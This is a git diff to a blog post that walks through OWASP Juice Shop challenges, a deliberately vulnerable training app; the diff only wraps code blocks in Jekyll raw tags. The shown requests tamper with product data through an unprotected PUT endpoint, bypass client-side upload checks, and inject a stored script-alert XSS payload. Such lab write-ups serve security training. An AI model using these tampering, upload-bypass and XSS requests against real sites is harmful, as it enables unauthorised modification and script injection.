@@ -315,7 +315,7 @@ We'll try to use a different HTTP verb to update this information. There isn't a
 
 Attempting to send over just a description...
 
-```
+```{% raw %}
 PUT /api/Products/9 HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -326,7 +326,7 @@ Referer: http://juice.shop:3000/
 Authorization: [...]
 
 {"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
-```
+{% endraw %}```
 
 HTTP 200 is promising, but the response body contains the unmodified description. Subsequent GET requests also respond with the original description.
 
@@ -341,7 +341,7 @@ After much time wasting and a hint from [Dejan](https://dejandayoff.com/) to loo
 
 Adding Content-Type...
 
-```
+```{% raw %}
 PUT /api/Products/9 HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -353,16 +353,16 @@ Referer: http://juice.shop:3000/
 Authorization: [...]
 
 {"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
-```
+{% endraw %}```
 
 Much better.
 
-```
+```{% raw %}
 HTTP/1.1 200 OK
 [...]
 
 {"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>","price":0.01,"image":"orange_juice.jpg","createdAt":"2018-08-02T00:52:16.120Z","updatedAt":"2018-08-07T16:48:15.494Z","deletedAt":null}}
-```
+{% endraw %}```
 
 ![tampering](/img/owasp-juice-shop-v7.3.0/juice058.png)
 
@@ -370,7 +370,7 @@ A quick note on REST APIs. I expected to use a PATCH verb here since we're perfo
 
 My attempts at PATCH all returned HTTP 500 errors.
 
-```
+```{% raw %}
 PATCH /api/Products/9 HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -382,7 +382,7 @@ Referer: http://juice.shop:3000/
 Authorization: [...]
 
 {"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
-```
+{% endraw %}```
 
 ```
 HTTP/1.1 500 Internal Server Error
@@ -466,7 +466,7 @@ This restriction is client-side as no requests containing information about the 
 
 First, determine the normal flow of things by uploading a file that is under 100K. I'll use a [PDF sample file](https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf) I found online.
 
-```
+```{% raw %}
 POST /file-upload HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -488,7 +488,7 @@ Content-Type: application/pdf
 <file contents here>
 
 -----------------------------280159537844478784409472582--
-```
+{% endraw %}```
 
 To make a 100K PDF file, I appended 100K or so of random garbage to the end of my small dummy file using `dd`.
 
@@ -524,7 +524,7 @@ Finding and disabling or tampering with the client-side code responsible for thi
 
 As above, upload a file normally to capture the POST request and send it to Burp Repeater. Replace the contents of the file with some text, and change the 'filename' to something other than PDF.  Keep 'application/pdf' as the Content-Type.
 
-```
+```{% raw %}
 POST /file-upload HTTP/1.1
 [Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -541,7 +541,7 @@ Content-Type: application/pdf
 what if i'm just a test file :'(
 
 -----------------------------185727723014332259391007075656--
-```
+{% endraw %}```
 
 Likely the application is checking the Content-Type to confirm it's a PDF, but ignoring the filename (extension) and the contents of the file itself.
 
@@ -625,7 +625,7 @@ HTTP/1.1 200 OK
 
 As in the Product Tampering challenge, we can surmise the form of a PUT or POST request by looking at the key/value pairs in the JSON of a related GET request like the one immediately above. In this case, we'll try including values for the name, description, price, image, and deletedAt keys. Make sure to include the Content-Type header.
 
-```
+```{% raw %}
 POST /api/Products HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -637,7 +637,7 @@ Referer: http://juice.shop:3000/
 Authorization: [...]
 
 {"name":"n0j sauce","description":"hide yo kids","price":0.99,"image":"apple_juice.jpg", "deletedAt":null}
-```
+{% endraw %}```
 
 ```
 HTTP/1.1 201 Created
@@ -652,7 +652,7 @@ HTTP 201 is good - checking the main page for the new product,
 
 Repeat the same request but with the XSS payload in the description.
 
-```
+```{% raw %}
 POST /api/Products HTTP/1.1
 Host: juice.shop:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -664,7 +664,7 @@ Referer: http://juice.shop:3000/
 Authorization: [...]
 
 {"name":"XSS3","description":"<script>alert(\"XSS\")</script>","price":0.99,"image":"apple_juice.jpg", "deletedAt":null}
-```
+{% endraw %}```
 
 ![XSS3](/img/owasp-juice-shop-v7.3.0/juice066.png)
 
